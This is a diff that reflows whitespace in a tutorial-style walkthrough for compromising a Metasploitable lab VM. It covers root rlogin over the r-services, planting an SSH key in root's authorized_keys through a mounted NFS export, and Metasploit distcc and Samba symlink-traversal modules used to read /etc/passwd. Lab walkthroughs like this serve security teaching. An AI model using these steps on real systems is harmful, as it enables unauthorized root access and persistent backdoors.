@@ -64,49 +64,78 @@ nmap -Pn --script vuln 192.168.1.105
 # [](#header-1)Step 1: Exploitation and Acess Gaining
 
    There are various to gain access to the Metasploitable target machine. Lets try them as follows,
+
 **_METHOD 1:_**
    
    Ports 512,513,514 offers the ‘r’ services, it means that remote access can be gained from any host using the IP address.
-So, 
-	open a terminal
-	type, **_# rlogin -l root ip_address_** 	
-// if asks for password then probably rsh-client  is not installed, else you will be in that machine 
-	**_# apt install rsh-client_**
-	now execute **_# rlogin -l root ip_address_** 	
+   
+   So open a terminal and type, 
+   
+   **_# rlogin -l root ip_address_** 	
+
+// if asks for password then probably rsh-client is not installed, else you will be in that target machine.
+
+   **_# apt install rsh-client_**
+
+   now execute **_# rlogin -l root ip_address_** 	
+
 // should work perfectly if that service is open
 
 
 **_METHOD 2: SSH LOGIN_**
 
    For this we need to generate the RSA key and kinda have to copy that key to that target machine using rpcbind and NFS (port 2049) mount the NFS export (for exporting), and add our key to the root user account's authorized_keys file.
-       **_# apt update
-         # apt install rpcbind nfs-common
-         # rpcinfo -p ip_address
-         # showmount -e ip_address
-         # ssh-keygen	//just press enter for the questions asked for default settings
-         # mkdir /tmp/r00t
-         # mount -t nfs ip_address:/ /tmp/r00t
-         # cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
-         # umount /tmp/r00t
-         # ssh root@ip_address_**
+      
+   **_# apt update
+       
+   # apt install rpcbind nfs-common
+	
+   # rpcinfo -p ip_address
+         
+   # showmount -e ip_address
+         
+   # ssh-keygen	//just press enter for the questions asked for default settings
+         
+   # mkdir /tmp/r00t
+        
+   # mount -t nfs ip_address:/ /tmp/r00t
+   
+   # cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
+   
+   # umount /tmp/r00t
+   
+   # ssh root@ip_address_**
          
          
 **_METHOD 3: SMB 445_**
-	Samba, can also be used as a backdoor to access files that were not meant to be shared when configured with a writeable file share and "wide links" enabled. I used Metasploit Framework to compromise the target.
+
+   Samba, can also be used as a backdoor to access files that were not meant to be shared when configured with a writeable file share and "wide links" enabled. I used Metasploit Framework to compromise the target.
 	
    On msfconsole,
-      > msf use exploit/unix/misc/distcc_
-      > set rhost 192.168.214.129
-      > exploit
+   
+   > msf use exploit/unix/misc/distcc_
+   
+   > set rhost 192.168.214.129
+   
+   > exploit
+   
    On another terminal
-      # smbclient -L //ip_address
+   
+   # smbclient -L //ip_address
+   
    On msfconsole,
-      > use auxiliary/admin/smb/samba_symlink_traversal
-      msf5 auxiliary(admin/smb/samba_symlink_traversal) > set rhost ip_address
-      msf5 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp
-      msf5 auxiliary(admin/smb/samba_symlink_traversal) > exploit
-	On terminal,
-      smbclient  //ip_address/tmp
+    
+   > use auxiliary/admin/smb/samba_symlink_traversal
+
+   msf5 auxiliary(admin/smb/samba_symlink_traversal) > set rhost ip_address
+   
+   msf5 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp
+   
+   msf5 auxiliary(admin/smb/samba_symlink_traversal) > exploit
+
+   On terminal,
+   
+   # smbclient  //ip_address/tmp
 			// now you will have the smb shell access, try #cd rootfs #cd etc and #more passwd
 
 
